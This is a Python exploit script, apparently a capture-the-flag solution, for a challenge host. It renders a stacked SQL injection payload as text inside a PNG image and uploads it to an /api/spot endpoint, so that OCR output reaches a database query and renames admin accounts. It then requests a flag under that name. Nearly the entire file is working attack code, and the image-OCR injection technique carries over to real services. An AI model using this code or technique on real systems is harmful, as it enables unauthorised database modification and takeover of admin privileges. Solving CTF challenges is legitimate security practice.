#!/usr/bin/env python3
import io
import re
import sys
import time

import requests
from PIL import Image, ImageDraw, ImageFont

BASE_URL = "http://hackersbotted.squ1rrel.dev"
ADMIN_MARKER = "ownedadmin"


def build_payload_image(payload: str) -> bytes:
    img = Image.new("RGB", (3600, 260), "white")
    draw = ImageDraw.Draw(img)

    font_paths = [
        "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
    ]
    font = None
    for fp in font_paths:
        try:
            font = ImageFont.truetype(fp, 58)
            break
        except OSError:
            continue
    if font is None:
        font = ImageFont.load_default()

    draw.text((20, 80), payload, fill="black", font=font)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def exploit(base_url: str) -> str:
    session = requests.Session()

    payload = (
        "x' UNION SELECT 'user'; "
        f"UPDATE users SET name='{ADMIN_MARKER}' WHERE role='admin'; "
        "SELECT 'user"
    )
    image_bytes = build_payload_image(payload)

    files = {"photo": ("payload.png", image_bytes, "image/png")}
    data = {"spotter": "alice"}

    # Trigger SQLi through OCR text in /api/spot
    session.post(f"{base_url}/api/spot", files=files, data=data, timeout=20)

    # Brief delay to avoid rate-limit edge and ensure update committed.
    time.sleep(1.2)

    r = session.post(
        f"{base_url}/api/flag",
        json={"username": ADMIN_MARKER},
        timeout=20,
    )
    r.raise_for_status()
    j = r.json()
    if "flag" not in j:
        raise RuntimeError(f"Flag not found in response: {j}")
    return j["flag"]


def main() -> None:
    base = sys.argv[1] if len(sys.argv) > 1 else BASE_URL
    flag = exploit(base)

    if not re.match(r"^[A-Za-z0-9_{}\-]+$", flag):
        print(flag)
        return

    print(flag)


if __name__ == "__main__":
    main()
